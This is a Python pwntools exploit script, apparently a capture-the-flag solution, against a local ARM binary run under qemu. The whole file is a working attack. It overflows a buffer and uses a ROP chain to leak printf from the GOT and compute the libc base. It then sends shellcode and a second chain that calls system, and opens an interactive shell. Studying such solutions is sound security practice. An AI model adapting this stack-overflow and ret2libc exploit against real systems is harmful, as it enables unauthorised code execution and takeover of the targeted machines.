#coding=utf-8
from pwn import *

r = lambda p:p.recv()
rl = lambda p:p.recvline()
ru = lambda p,x:p.recvuntil(x)
rn = lambda p,x:p.recvn(x)
rud = lambda p,x:p.recvuntil(x,drop=True)
s = lambda p,x:p.send(x)
sl = lambda p,x:p.sendline(x)
sla = lambda p,x,y:p.sendlineafter(x,y)
sa = lambda p,x,y:p.sendafter(x,y)

context.update(arch='arm',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./bin')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
libc = ELF('/usr/arm-linux-gnueabihf/lib/libc.so.6')
if debug == 1:
    p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./bin"])
elif debug == 2:
    p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabihf", "./bin"])

p_r3_pc = 0x00010348

def exp():
    #leak libc
    bss = elf.bss()+0x500
    sc = asm(shellcraft.sh())
    payload = 'a'*0x100
    payload += p32(bss+0x104)
    payload += p32(p_r3_pc)
    payload += p32(elf.got['printf'])
    payload += p32(0x104d8)
    p.recvuntil("input: ")
    raw_input()
    p.sendline(payload)
    libc_base = u32(p.recvn(4)) - libc.sym['printf']
    log.success("libc base => " + hex(libc_base))
    raw_input()
    p_r0_r = libc_base + 0x00056b7c
    payload = sc
    payload = payload.ljust(0x100,'\x00')
    payload += p32(bss+4)
    payload += p32(p_r0_r)
    payload += p32(libc_base+0x000ca574)+p32(0)
    payload += p32(libc_base+libc.sym['system'])
    p.sendline(payload)
    p.interactive()

exp()
